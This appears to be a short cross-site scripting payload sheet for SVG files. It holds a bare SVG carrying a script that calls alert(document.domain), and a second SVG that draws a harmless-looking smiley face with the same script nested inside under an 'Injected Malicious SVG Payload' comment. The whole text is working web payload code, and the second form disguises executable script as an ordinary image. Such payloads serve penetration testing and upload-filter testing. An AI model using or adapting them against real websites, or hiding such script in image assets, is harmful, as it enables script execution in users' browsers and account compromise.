# xss_svg_payloads

**Raw**

```xml
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500">
    <script>//<![CDATA[
        alert(document.domain)
    //]]>
    </script>
</svg>
```

**Binded**

```xml
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
  <!-- Head -->
  <circle cx="50" cy="50" r="40" fill="yellow" />

  <!-- Eyes -->
  <circle cx="35" cy="40" r="5" fill="black" />
  <circle cx="65" cy="40" r="5" fill="black" />

  <!-- Mouth -->
  <path d="M 30,60 Q 50,70 70,60" fill="none" stroke="black" stroke-width="2" />

  <!-- Injected Malicious SVG Payload -->
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500">
    <script>//<![CDATA[
        alert(document.domain)
    //]]>
    </script>
  </svg>
</svg>
```
